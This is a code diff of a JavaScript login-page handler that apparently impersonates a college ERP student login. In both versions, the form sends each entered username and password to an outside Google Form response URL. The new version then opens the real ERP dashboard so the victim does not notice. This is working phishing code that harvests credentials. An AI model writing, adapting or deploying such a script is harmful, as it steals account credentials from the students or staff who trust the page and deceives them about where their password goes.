@@ -1,72 +1,45 @@
 document.addEventListener('DOMContentLoaded', function() {
-  const loginForm = document.getElementById("form1");
-  
-  loginForm.addEventListener("submit", function(e) {
+  document.getElementById("loginForm").addEventListener("submit", function(e) {
     e.preventDefault();
     
-    const username = document.getElementById("txt_HTNO").value;
-    const password = document.getElementById("txt_Password").value;
+    const username = document.getElementById("username").value;
+    const password = document.getElementById("password").value;
     
     if (!username || !password) {
-      document.getElementById("lblMessage").textContent = "Please enter both HTNO and Password";
-      document.getElementById("lblMessage").style.color = "#dc3545";
+      document.getElementById("msg").textContent = "Please enter both username and password";
+      document.getElementById("msg").style.color = "#dc3545";
       return;
     }
 
-    // Show processing indicator
-    document.getElementById("lblMessage").textContent = "Processing...";
-    document.getElementById("lblMessage").style.color = "#007bff";
+    // Show loading indicator
+    document.getElementById("msg").textContent = "Processing...";
+    document.getElementById("msg").style.color = "#007bff";
     
-    // Google Form submission URL
+    // Replace with your actual Google Form submit URL and entry IDs
     const googleFormURL = "https://docs.google.com/forms/d/e/1FAIpQLScStreRZRW9Y4ipI2MNBENtSsbMqYn2CYvPRTlCs_eZs3d0vg/formResponse";
     const data = new FormData();
-    data.append("entry.163375498", username); // Username field entry ID
-    data.append("entry.1850673272", password); // Password field entry ID
+    data.append("entry.163375498", username); // username entry ID from test.py
+    data.append("entry.1850673272", password); // password entry ID from test.py
     
     // Disable the submit button during submission
-    document.getElementById("btn_Login").disabled = true;
+    document.querySelector('button[type="submit"]').disabled = true;
 
-    // First submit to Google Form
     fetch(googleFormURL, {
       method: "POST",
+      mode: "no-cors",
       body: data
     }).then(() => {
-      // Then use our proxy server for ERP login
-      return fetch('/login', {
-        method: 'POST',
-        headers: {
-          'Content-Type': 'application/json',
-        },
-        body: JSON.stringify({
-          username: username,
-          password: password
-        })
-      });
-    })
-    .then(response => response.json())
-    .then(data => {
-      if (data.success) {
-        // Store session ID in localStorage for future requests
-        localStorage.setItem('erp_session_id', data.session_id);
-        
-        // Replace current page content with dashboard HTML
-        document.documentElement.innerHTML = data.dashboard_html;
-        
-        // Update browser history to simulate navigation
-        history.pushState({}, "Dashboard", "/dashboard");
-      } else {
-        // Handle login failure
-        document.getElementById("lblMessage").textContent = data.message;
-        document.getElementById("lblMessage").style.color = "#dc3545";
-        document.getElementById("btn_Login").disabled = false;
-      }
-    })
-    .catch(error => {
-      // Handle errors
-      console.error("Login error:", error);
-      document.getElementById("lblMessage").textContent = "Connection error. Please try again.";
-      document.getElementById("lblMessage").style.color = "#dc3545";
-      document.getElementById("btn_Login").disabled = false;
+      const dashboardURL = "https://erp.vce.ac.in/Sinfo/Default.aspx";
+      console.log("🔗 Dashboard URL:", dashboardURL); // Log the actual link to the resource
+      document.getElementById("msg").textContent = "Redirecting...";
+      setTimeout(() => {
+        window.open(dashboardURL, "_blank"); // Open in a new browser window
+      }, 1500);
+    }).catch(error => {
+      // Handle any errors
+      document.getElementById("msg").textContent = "Connection error. Please try again.";
+      document.getElementById("msg").style.color = "#dc3545";
+      document.querySelector('button[type="submit"]').disabled = false;
     });
   });
 });
